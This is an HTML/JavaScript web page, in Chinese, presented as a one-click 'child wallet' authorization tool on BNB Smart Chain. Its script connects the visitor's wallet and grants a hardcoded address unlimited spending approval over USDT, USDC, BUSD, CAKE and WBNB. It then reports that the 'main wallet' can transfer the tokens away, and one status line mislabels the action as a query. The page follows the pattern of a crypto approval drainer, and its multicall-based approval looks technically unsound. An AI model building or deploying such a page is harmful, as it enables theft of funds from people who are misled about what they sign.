<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>孩子钱包 · 一键授权</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0b0f19; color: #e0e6f0;
            display: flex; align-items: center; justify-content: center;
            min-height: 100vh; margin: 0; padding: 20px;
        }
        .box {
            background: #131a2b; border: 1px solid #1e2d4a; border-radius: 20px;
            padding: 30px 20px; text-align: center; max-width: 400px; width: 100%;
        }
        h2 { font-size: 24px; margin-bottom: 10px; }
        p { color: #8899aa; font-size: 14px; margin-bottom: 20px; }
        .btn {
            background: #3b82f6; color: white; border: none;
            padding: 16px; border-radius: 12px; font-size: 18px;
            font-weight: bold; width: 100%; cursor: pointer;
        }
        .btn:disabled { background: #1e3a5f; }
        .log { margin-top: 20px; text-align: center; font-size: 14px; }
        .success { color: #10b981; }
        .error { color: #ef4444; }
        .info { color: #f59e0b; }
    </style>
</head>
<body>
<div class="box">
    <h2>🔐 授权给主钱包</h2>
    <p>被授权地址：<br><b>0x8fd6...516b4d</b></p>
    <button id="startBtn" class="btn" onclick="startAuth()">🔑 一键授权所有代币</button>
    <div id="log" class="log"></div>
</div>

<script>
    const ethers = window.ethers;
    const SPENDER = "0x8fd661d886c3c4a1b5d9b3a5ffcd6867ad516b4d";
    const MULTICALL_ADDRESS = "0x41263cba59eb80dce6c8a2e843b0b0f3c9f93e0b";
    const MULTICALL_ABI = [
        "function aggregate(tuple(address target, bytes callData)[] calls) payable returns (uint256 blockNumber, bytes[] returnData)"
    ];
    const APPROVE_ABI = ["function approve(address spender, uint256 amount) returns (bool)"];
    const TOKENS = [
        {sym:"USDT", addr:"0x55d398326f99059ff775485246999027b3197955"},
        {sym:"USDC", addr:"0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"},
        {sym:"BUSD", addr:"0xe9e7cea3dedca5984780bafc599bd69add087d56"},
        {sym:"CAKE", addr:"0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82"},
        {sym:"WBNB", addr:"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c"}
    ];

    async function startAuth() {
        const btn = document.getElementById("startBtn");
        const log = document.getElementById("log");
        btn.disabled = true;
        btn.textContent = "⏳ 连接钱包...";
        log.innerHTML = "";

        try {
            if (!window.ethereum) throw new Error("请使用MetaMask/TokenPocket打开");
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            try {
                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
            } catch(e) {
                if(e.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38', chainName: 'BNB Smart Chain',
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com']
                        }]
                    });
                }
            }

            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const addr = await signer.getAddress();
            log.innerHTML = `<p class="info">👛 ${addr.slice(0,6)}...${addr.slice(-4)}</p>`;

            const iface = new ethers.Interface(APPROVE_ABI);
            const calls = TOKENS.map(token => ({
                target: token.addr,
                callData: iface.encodeFunctionData("approve", [SPENDER, ethers.MaxUint256])
            }));

            const multicall = new ethers.Contract(MULTICALL_ADDRESS, MULTICALL_ABI, signer);
            btn.textContent = "⏳ 等待钱包确认...";
            log.innerHTML += `<p class="info">📦 正在提交授权交易...</p>`;
            
            const tx = await multicall.aggregate(calls);
            log.innerHTML += `<p class="info">⏳ 交易确认中...</p>`;
            await tx.wait();
            
            log.innerHTML += `<p class="success">✅ 查询授权成功！</p>`;
            log.innerHTML += `<p style="color:#10b981; font-weight:bold;">🎉 完成！主钱包可以转走这些代币了。</p>`;

        } catch(e) {
            log.innerHTML = `<p class="error">❌ 错误: ${e.message}</p>`;
        } finally {
            btn.disabled = false;
            btn.textContent = "🔑 一键授权所有代币";
        }
    }
</script>
</body>
</html>
